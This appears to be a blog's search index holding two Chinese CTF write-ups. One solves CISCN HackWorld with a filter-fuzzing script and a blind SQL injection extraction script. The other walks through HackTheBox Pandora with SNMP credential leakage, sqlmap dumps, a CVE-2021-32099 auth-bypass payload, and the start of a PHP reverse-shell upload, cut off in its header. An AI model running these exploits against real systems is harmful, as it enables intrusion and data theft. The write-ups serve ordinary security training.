<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CISCN-HackWorld</title>
      <link href="/2022/02/08/World/"/>
      <url>/2022/02/08/World/</url>
      
        <content type="html"><![CDATA[<h1 id="题目审计"><a href="#题目审计" class="headerlink" title="题目审计"></a>题目审计</h1><p><img src="https://s2.loli.net/2022/02/09/dOTQpmVL1o6G8SX.png" alt="image.png"><br>题目告诉我们答案在<strong>flag表</strong>中的<strong>flag列</strong>，接下来我们要做的就是看看过滤了哪些字符，然后想办法获取数据。</p><h1 id="过滤的字符"><a href="#过滤的字符" class="headerlink" title="过滤的字符"></a>过滤的字符</h1><p>可以直接使用burpsuite来进行fuzz，这里作者采用编写python脚本来进行fuzz。</p><div class="hide-toggle" ><div class="hide-button toggle-title" style=""><i class="fas fa-caret-right fa-fw"></i><span>fuzz脚本</span></div>    <div class="hide-content"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pickle <span class="keyword">import</span> NONE</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">payload_list = []</span><br><span class="line">valid_payload = []</span><br><span class="line">url = <span class="string">&quot;http://2cbe5bdd-ba44-4105-9f29-00d6712a52d0.node4.buuoj.cn:81/index.php&quot;</span></span><br><span class="line">dict_file = <span class="string">&quot;C:\\Users\\stw\\Desktop\\dict.txt&quot;</span></span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(dict_file)</span><br><span class="line">payload_list  =f.readlines()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(payload_list)):</span><br><span class="line">    payload_list[i] = payload_list[i][:-<span class="number">1</span>] <span class="comment"># 去掉每个字符串结尾的换行符</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> payload <span class="keyword">in</span> payload_list:</span><br><span class="line">    r = requests.post(url=url, data=&#123;<span class="string">&#x27;id&#x27;</span>: payload&#125;)</span><br><span class="line">    res = re.search(<span class="string">&#x27;SQL Injection Checked.&#x27;</span>, r.text)</span><br><span class="line">    <span class="keyword">if</span> res <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        valid_payload.append(payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(valid_payload)</span><br></pre></td></tr></table></figure></div></div><div class="hide-toggle" ><div class="hide-button toggle-title" style=""><i class="fas fa-caret-right fa-fw"></i><span>未过滤的字符</span></div>    <div class="hide-content"><p>[‘+’, ‘likeLiKe’, ‘sleepSLEEp’, ‘databaseDATABASe’, ‘delete’, ‘having’, ‘oroR’, ‘asAs’, ‘-~’, ‘BENCHMARK’, ‘limitLimIt’, ‘leftLeft’, ‘selectSELECT’, ‘insertinsERTINSERT’, ‘right’, ‘#’, ‘–’, ‘;’, ‘!’, ‘%’, ‘+’, ‘&lt;&gt;’, ‘(‘, ‘&gt;’, ‘&lt;’, ‘)’, ‘.’, ‘^’, ‘=’, ‘ANDANd’, ‘BYBy’, ‘CAST’, ‘COLUMNCOlumn’, ‘COUNTCount’, ‘CREATE’, ‘END’, ‘case’, “‘1’=’1”, ‘when’, “admin’”, ‘“‘, ‘+’, ‘REVERSE’, ‘’, ‘asciiASSICASSic’, ‘database’, ‘left’, ‘right’, ‘unionUNIonUNION’, ‘“‘, ‘&amp;’, ‘&amp;&amp;’, ‘||’, ‘/‘,<br>‘//‘, ‘<em>/</em>‘, ‘GROUP’, ‘HAVING’, ‘IF’, ‘INTO’, ‘JOIN’, ‘LEAVE’, ‘LEFT’, ‘LEVEL’, ‘sleep’, ‘LIKE’, ‘NAMES’, ‘NEXT’, ‘NULL’, ‘OF’, ‘ON’, ‘|’, ‘infromation_schema’, ‘user’, ‘OR’, ‘ORDER’, ‘ORD’, ‘SCHEMA’, ‘SELECT’, ‘SET’, ‘TABLE’, ‘THEN’, ‘UNION’, ‘UPDATE’, ‘USER’, ‘USING’, ‘VALUE’, ‘VALUES’, ‘WHEN’, ‘WHERE’, ‘ADD’, ‘AND’, ‘prepare’, ‘set’, ‘update’, ‘delete’, ‘drop’, ‘inset’, ‘CAST’, ‘COLUMN’, ‘CONCAT’, ‘GROUP_CONCAT’, ‘group_concat’, ‘CREATE’, ‘DATABASE’, ‘DATABASES’, ‘alter’,<br>‘DELETE’, ‘DROP’, ‘TABLE_SCHEMA’, ‘%df’, ‘concat_ws()’, ‘concat’, ‘LIMIT’, ‘ORD’, ‘ON’, ‘extractvalue’, ‘CAST()’, ‘by’,<br>‘ORDER’, ‘OUTFILE’, ‘RENAME’, ‘REPLACE’, ‘SCHEMA’, ‘SELECT’, ‘SET’, ‘updatexml’, ‘SHOW’, ‘SQL’, ‘TABLE’, ‘THEN’, ‘TRUE’, ‘instr’, ‘benchmark’, ‘bin’, ‘substring’, ‘ord’, ‘’, ‘UPDATE’, ‘VALUES’, ‘VARCHAR’, ‘VERSION’, ‘WHEN’, ‘WHERE’, ‘`’, ‘<br> ‘, ‘,’, ‘users’, ‘%0a%0A’, ‘%0b’, ‘mid’, ‘REGEXP’, ‘RLIKE’, ‘in’, ‘sys.schema_table_statistics_with_buffer’, ‘INFILE’,<br>‘count’, ‘%0c’, ‘from’, ‘%0d’, ‘%a0’, ‘=’, ‘@’, ‘else%27%23%22%2’]</p></div></div><h1 id="进行绕过"><a href="#进行绕过" class="headerlink" title="进行绕过"></a>进行绕过</h1><h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><p>SQL注入中如果禁用了空格，那么可以使用如下两种方法进行绕过：</p><ol><li><code>/**/</code>注释符绕过</li><li><code>()</code>括号子查询绕过<br>由于注释符被过滤，所以只能采用括号进行绕过。<br>在mysql中括号一般用来包围子查询或者查询条件，可是括号的作用不止这些，只要是返回结果的语句都可以用括号围起来，并且不需要空格来与其他部分分隔开。<br><img src="https://s2.loli.net/2022/02/09/dYDXMFHgoAUBvkb.png" alt="image.png"></li></ol><h2 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h2><p>当输入<code>1</code>时会返回<code>Hello, glzjin wants a girlfriend.</code> 输入其他的值则不会返回，并且不会返回详细的错误信息。<br>那么就可以知道这基本上就是一个布尔盲注了。在我们进行一个一个的字符比较时，如果相等则会返回1,否则返回0，利用这一点编写脚本。<br>其次该程序没有过滤掉<code>ascii</code>和<code>mid</code>函数，我们就可以利用这两个函数来进行比较。<br>整体思路如下所示：</p><ul><li>布尔盲注，按顺序的进行字符比较</li><li>服务器返回<code>Hello, glzjin wants a girlfriend.</code>则证明字符相等。</li></ul><div class="hide-toggle" ><div class="hide-button toggle-title" style=""><i class="fas fa-caret-right fa-fw"></i><span>exp</span></div>    <div class="hide-content"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pickle <span class="keyword">import</span> NONE</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">timeBasedBlindInject</span>(<span class="params">url</span>):</span></span><br><span class="line">    sql_dict = string.printable</span><br><span class="line">    res = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">80</span>):</span><br><span class="line">        <span class="keyword">for</span> ascii_string <span class="keyword">in</span> sql_dict:</span><br><span class="line">            data = <span class="string">f&#x27;(select(ascii(mid(flag,<span class="subst">&#123;pos&#125;</span>,1))=<span class="subst">&#123;<span class="built_in">ord</span>(ascii_string)&#125;</span>)from(flag))&#x27;</span></span><br><span class="line">            data = &#123;<span class="string">&quot;id&quot;</span>: data&#125;</span><br><span class="line">            r = requests.post(url=url, data=data)</span><br><span class="line">            <span class="keyword">if</span> re.search(<span class="string">&quot;Hello, glzjin wants a girlfriend.&quot;</span>, r.text):</span><br><span class="line">                res = res + ascii_string</span><br><span class="line">                <span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://15314337-d129-4e59-a6c1-81088d3c5c92.node4.buuoj.cn:81/index.php&quot;</span></span><br><span class="line">timeBasedBlindInject(url)</span><br></pre></td></tr></table></figure></div></div><p>最后查看程序输出即可得到flag。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> web </category>
          
          <category> ciscn </category>
          
          <category> 2019 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ciscn2019 </tag>
            
            <tag> sql盲注 </tag>
            
            <tag> fuzz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB-Pandora</title>
      <link href="/2022/01/29/HTB-Pandora/"/>
      <url>/2022/01/29/HTB-Pandora/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>利用靶场来练习，可以很好的考验自己所学知识。此次玩的是<a href="https://www.hackthebox.com/">hackthebox</a>上面的Pandora盒子，与我之前打过的几个靶机有些共同的特点，考验了CVE利用能力，总的来说还是学到了不少东西。<br>过程概览：</p><ul><li>TCP扫描无果改为UDP扫描发现SNMP服务</li><li>扫描SNMP泄露的信息发现账号和密码</li><li>登录后发现有个内部的服务，通过端口转发，发现是Pandora FMS系统</li><li>查询Pandora的历史漏洞，发现存在SQL注入</li><li>利用SQL注入登录管理后台</li><li>后台上传shell得到普通flag</li><li>查看特权文件发现/usr/bin/pandora_backup存在环境变量注入，利用获取root shell<h1 id="信息发现"><a href="#信息发现" class="headerlink" title="信息发现"></a>信息发现</h1>TCP扫描发现开启了80和22端口。<br><img src="https://s2.loli.net/2022/01/29/qSZ6NK7M543bQWO.png" alt="image.png"><br>目录扫描发现存在目录遍历，但是没有什么特殊的文件，都是一些静态文件。<br><code>nmap -sC -sV -sU 10.10.11.136</code>进行UDP端口扫描。端口的服务是分TCP和UDP的，当时没有想到这个点。<br><img src="https://s2.loli.net/2022/01/29/SfWvxEntolBzrme.png" alt="image.png"><br>发现开启了SNMP服务，通过工具来扫描支持SNMP协议其他设备的一些信息，来看看存不存在敏感的信息。<br><code>snmpwalk -v 2c -c public 10.10.11.136 &gt; snmp.txt</code>扫描设备的一些信息。<br><img src="https://s2.loli.net/2022/01/29/9W7tqbUZYkBgjFA.png" alt="image.png"><br>发现存在用户名<mark class="hl-label blue">daniel</mark> 密码<mark class="hl-label blue">HotelBabylon23</mark> <br>登录后使用<code>netstat -antl</code>查看开放的端口，发现本地80端口开放了服务。<br><code>sudo ssh -L 80:127.0.0.1:80 daniel@10.10.11.136</code>在本地主机上输入命令，将本地的80端口映射到远程主机本地的80端口上，访问<code>http://127.0.0.1:80</code>发现是Pandora FMS服务。<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><h2 id="普通用户"><a href="#普通用户" class="headerlink" title="普通用户"></a>普通用户</h2>首页显示的Pandora FMS版本为7.0NG.742_FIX_PERL2020存在<a href="https://www.cve.org/CVERecord?id=CVE-2021-32099">SQL注入漏洞</a>。<h3 id="漏洞解释"><a href="#漏洞解释" class="headerlink" title="漏洞解释"></a>漏洞解释</h3><div class="hide-toggle" ><div class="hide-button toggle-title" style=""><i class="fas fa-caret-right fa-fw"></i><span>/include/chart_generator.php</span></div>    <div class="hide-content"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">71</span>  <span class="comment">// Try to initialize session using existing php session id.</span></span><br><span class="line"><span class="number">72</span>  <span class="variable">$user</span> = <span class="keyword">new</span> PandoraFMS\User([<span class="string">&#x27;phpsessionid&#x27;</span> =&gt; <span class="variable">$_REQUEST</span>[<span class="string">&#x27;session_id&#x27;</span>]]);</span><br><span class="line"><span class="number">73</span>  <span class="keyword">if</span> (check_login(<span class="literal">false</span>) === <span class="literal">false</span>) &#123;   </span><br><span class="line"><span class="number">74</span>     <span class="comment">// Error handler.</span></span><br><span class="line"> ⋮</span><br><span class="line"><span class="number">96</span>  &#125;</span><br><span class="line"><span class="number">97</span></span><br><span class="line"><span class="number">98</span>  <span class="comment">// Access granted.</span></span><br></pre></td></tr></table></figure></div></div><div class="hide-toggle" ><div class="hide-button toggle-title" style=""><i class="fas fa-caret-right fa-fw"></i><span>/include/lib/User.php</span></div>    <div class="hide-content"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">60</span>  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">61  </span>&#123;</span><br><span class="line"> ⋮</span><br><span class="line"><span class="number">68</span>     <span class="keyword">if</span> (is_array(<span class="variable">$data</span>) === <span class="literal">true</span>) &#123;</span><br><span class="line"><span class="number">69</span>        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$data</span>[<span class="string">&#x27;phpsessionid&#x27;</span>]) === <span class="literal">true</span>) &#123;</span><br><span class="line"><span class="number">70</span>           <span class="keyword">$this</span>-&gt;sessions[<span class="variable">$data</span>[<span class="string">&#x27;phpsessionid&#x27;</span>]] = <span class="number">1</span>;</span><br><span class="line"><span class="number">71</span>           <span class="variable">$info</span> = \db_get_row_filter(</span><br><span class="line"><span class="number">72</span>              <span class="string">&#x27;tsessions_php&#x27;</span>,</span><br><span class="line"><span class="number">73</span>              [<span class="string">&#x27;id_session&#x27;</span> =&gt; <span class="variable">$data</span>[<span class="string">&#x27;phpsessionid&#x27;</span>]]</span><br><span class="line"><span class="number">74</span>          );</span><br><span class="line"><span class="number">75</span></span><br><span class="line"><span class="number">76</span>         <span class="keyword">if</span> (<span class="variable">$info</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line"><span class="number">77</span>            <span class="comment">// Process.</span></span><br><span class="line"><span class="number">78</span>            <span class="variable">$session_data</span> = session_decode(<span class="variable">$info</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"><span class="number">79</span>            <span class="keyword">$this</span>-&gt;idUser = <span class="variable">$_SESSION</span>[<span class="string">&#x27;id_usuario&#x27;</span>];</span><br><span class="line"><span class="number">80</span></span><br><span class="line"><span class="number">81</span>            <span class="comment">// Valid session.</span></span><br><span class="line"><span class="number">82</span>            <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line"><span class="number">83</span>         &#125;</span><br></pre></td></tr></table></figure></div></div><code>chart_generator.php</code>用从客户端收到的<em>session_id</em>来初始化User对象，并且验证是在<code>User.php</code>中进行的。验证的过程大致如下所示：<div class="mermaid-wrap"><pre class="mermaid-src" hidden>  graph TD    A[phpsessionid] --&gt;|tsessions_php表| B(查询满足条件的数据)    B --&gt; C(解码序列化的session数据)    C--&gt; |填充到| D[$_SESSION全局变量]    D --&gt; E(验证session)  </pre></div>先调用了<code>db_get_row_filter</code>以传进来的<em>session_id</em>为条件获取数据，之后调用<code>session_decode()</code>查询，利用返回的<code>data</code>列进行session的反序列化，然后填充到<code>SESSION</code>中，最后进行身份的验证。此处由于没有对用户的输入进行很好的过滤，导致了SQL注入漏洞，具体原因可以查看此<a href="https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained">链接</a>。<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3>由漏洞解析阶段可知最后的身份验证是根据data列来进行的，所以我们需要将data列设置为具有较高权限用户的序列化session。<br><code>sqlmap -u http://127.0.0.1/pandora_console/include/chart_generator.php?session_id= --dbms=mysql --current-db</code>：获取到当前数据库名为<em>pandora</em>。<br><code>sqlmap -u http://127.0.0.1/pandora_console/include/chart_generator.php?session_id= --dbms=mysql -D pandora --tables</code>：获取<em>pandora</em>数据库里面的所有表名。<div class="hide-toggle" ><div class="hide-button toggle-title" style=""><i class="fas fa-caret-right fa-fw"></i><span>表名</span></div>    <div class="hide-content"><p>Database: pandora<br>[178 tables]<br>+————————————+<br>| taddress                           |<br>| taddress_agent                     |<br>| tagent_access                      |<br>| tagent_custom_data                 |<br>| tagent_custom_fields               |<br>| tagent_custom_fields_filter        |<br>| tagent_module_inventory            |<br>| tagent_module_log                  |<br>| tagent_repository                  |<br>| tagent_secondary_group             |<br>| tagente                            |<br>| tagente_datos                      |<br>| tagente_datos_inc                  |<br>| tagente_datos_inventory            |<br>| tagente_datos_log4x                |<br>| tagente_datos_string               |<br>| tagente_estado                     |<br>| tagente_modulo                     |<br>| talert_actions                     |<br>| talert_commands                    |<br>| talert_snmp                        |<br>| talert_snmp_action                 |<br>| talert_special_days                |<br>| talert_template_module_actions     |<br>| talert_template_modules            |<br>| talert_templates                   |<br>| tattachment                        |<br>| tautoconfig                        |<br>| tautoconfig_actions                |<br>| tautoconfig_rules                  |<br>| tcategory                          |<br>| tcluster                           |<br>| tcluster_agent                     |<br>| tcluster_item                      |<br>| tcollection                        |<br>| tconfig                            |<br>| tconfig_os                         |<br>| tcontainer                         |<br>| tcontainer_item                    |<br>| tcredential_store                  |<br>| tdashboard                         |<br>| tdatabase                          |<br>| tdeployment_hosts                  |<br>| tevent_alert                       |<br>| tevent_alert_action                |<br>| tevent_custom_field                |<br>| tevent_extended                    |<br>| tevent_filter                      |<br>| tevent_response                    |<br>| tevent_rule                        |<br>| tevento                            |<br>| textension_translate_string        |<br>| tfiles_repo                        |<br>| tfiles_repo_group                  |<br>| tgis_data_history                  |<br>| tgis_data_status                   |<br>| tgis_map                           |<br>| tgis_map_connection                |<br>| tgis_map_has_tgis_map_con          |<br>| tgis_map_layer                     |<br>| tgis_map_layer_groups              |<br>| tgis_map_layer_has_tagente         |<br>| tgraph                             |<br>| tgraph_source                      |<br>| tgraph_source_template             |<br>| tgraph_template                    |<br>| tgroup_stat                        |<br>| tgrupo                             |<br>| tincidencia                        |<br>| titem                              |<br>| tlanguage                          |<br>| tlayout                            |<br>| tlayout_data                       |<br>| tlayout_template                   |<br>| tlayout_template_data              |<br>| tlink                              |<br>| tlocal_component                   |<br>| tlog_graph_models                  |<br>| tmap                               |<br>| tmensajes                          |<br>| tmetaconsole_agent                 |<br>| tmetaconsole_agent_secondary_group |<br>| tmetaconsole_event                 |<br>| tmetaconsole_event_history         |<br>| tmetaconsole_setup                 |<br>| tmigration_module_queue            |<br>| tmigration_queue                   |<br>| tmodule                            |<br>| tmodule_group                      |<br>| tmodule_inventory                  |<br>| tmodule_relationship               |<br>| tmodule_synth                      |<br>| tnetflow_filter                    |<br>| tnetflow_report                    |<br>| tnetflow_report_content            |<br>| tnetwork_component                 |<br>| tnetwork_component_group           |<br>| tnetwork_map                       |<br>| tnetwork_matrix                    |<br>| tnetwork_profile                   |<br>| tnetwork_profile_component         |<br>| tnetworkmap_ent_rel_nodes          |<br>| tnetworkmap_enterprise             |<br>| tnetworkmap_enterprise_nodes       |<br>| tnews                              |<br>| tnota                              |<br>| tnotification_group                |<br>| tnotification_source               |<br>| tnotification_source_group         |<br>| tnotification_source_group_user    |<br>| tnotification_source_user          |<br>| tnotification_user                 |<br>| torigen                            |<br>| tpassword_history                  |<br>| tperfil                            |<br>| tphase                             |<br>| tplanned_downtime                  |<br>| tplanned_downtime_agents           |<br>| tplanned_downtime_modules          |<br>| tplugin                            |<br>| tpolicies                          |<br>| tpolicy_agents                     |<br>| tpolicy_alerts                     |<br>| tpolicy_alerts_actions             |<br>| tpolicy_collections                |<br>| tpolicy_groups                     |<br>| tpolicy_modules                    |<br>| tpolicy_modules_inventory          |<br>| tpolicy_plugins                    |<br>| tpolicy_queue                      |<br>| tprofile_view                      |<br>| tprovisioning                      |<br>| tprovisioning_rules                |<br>| trecon_script                      |<br>| trecon_task                        |<br>| trel_item                          |<br>| tremote_command                    |<br>| tremote_command_target             |<br>| treport                            |<br>| treport_content                    |<br>| treport_content_item               |<br>| treport_content_item_temp          |<br>| treport_content_sla_com_temp       |<br>| treport_content_sla_combined       |<br>| treport_content_template           |<br>| treport_custom_sql                 |<br>| treport_template                   |<br>| treset_pass                        |<br>| treset_pass_history                |<br>| tserver                            |<br>| tserver_export                     |<br>| tserver_export_data                |<br>| tservice                           |<br>| tservice_element                   |<br>| tsesion                            |<br>| tsesion_extended                   |<br>| tsessions_php                      |<br>| tskin                              |<br>| tsnmp_filter                       |<br>| ttag                               |<br>| ttag_module                        |<br>| ttag_policy_module                 |<br>| ttipo_modulo                       |<br>| ttransaction                       |<br>| ttrap                              |<br>| ttrap_custom_values                |<br>| tupdate                            |<br>| tupdate_journal                    |<br>| tupdate_package                    |<br>| tupdate_settings                   |<br>| tuser_double_auth                  |<br>| tuser_task                         |<br>| tuser_task_scheduled               |<br>| tusuario                           |<br>| tusuario_perfil                    |<br>| tvisual_console_elements_cache     |<br>| twidget                            |<br>| twidget_dashboard                  |<br>+————————————+</p></div></div>由于原代码中是从<code>tsessions_php</code>表中获取数据的，所以我们查看该表的数据，<code>sqlmap -u http://127.0.0.1/pandora_console/include/chart_generator.php?session_id= --dbms=mysql -D pandora -T tsessions_php -C data,id_session --dump </code>，发现存在admin的session序列化数据。<br><img src="https://s2.loli.net/2022/01/31/LCqOIgdopsMNhQX.png" alt="image.png"><br>之后可以利用SQL注入来为<em>data</em>列赋值，<code>http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=%27union%20select%201,2,%27id_usuario|s:5:%22admin%22;%27%20as%20data--+</code>。<br>之后重新访问控制台界面，我们就会以admin的身份进入到后台。<br><img src="https://s2.loli.net/2022/01/31/wzYFbrCJ2Rne1c5.png" alt="image.png"><br>上传文件的地点：<br><img src="https://s2.loli.net/2022/01/31/R6wLDGl4PoB2Fyv.png" alt="image.png"><br>之后通过访问界面logo知道可以通过<code>http://127.0.0.1/pandora_console/images/</code>访问到上传的文件，所以可以在此点上传php webshell。<div class="hide-toggle" ><div class="hide-button toggle-title" style=""><i class="fas fa-caret-right fa-fw"></i><span>php_shell</span></div>    <div class="hide-content"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// php-reverse-shell - A Reverse Shell implementation in PHP</span></span><br><span class="line"><span class="comment">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This tool may be used for legal purposes only.  Users take full responsibility</span></span><br><span class="line"><span class="comment">// for any actions performed using this tool.  The author accepts no liability</span></span><br><span class="line"><span class="comment">// for damage caused by this tool.  If these terms are not acceptable to you, then</span></span><br><span class="line"><span class="comment">// do not use this tool.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// In all other respects the GPL version 2 applies:</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This program is free software; you can redistribute it and/or modify</span></span><br><span class="line"><span class="comment">// it under the terms of the GNU General Public License version 2 as</span></span><br><span class="line"><span class="comment">// published by the Free Software Foundation.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This program is distributed in the hope that it will be useful,</span></span><br><span class="line"><span class="comment">// but WITHOUT ANY WARRANTY; without even the implied warranty of</span></span><br><span class="line"><span class="comment">// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span></span><br><span class="line"><span class="comment">// GNU General Public License for more details.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// You should have received a copy of the GNU General Public License along</span></span><br><span class="line"><span class="comment">// with this program; if not, write to the Free Software Foundation, Inc.,</span></span><br><span class="line"><span class="comment">// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This tool may be used for legal purposes only.  Users take full responsibility</span></span><br><span class="line"><span class="comment">// for any actions performed using this tool.  If these terms are not acceptable 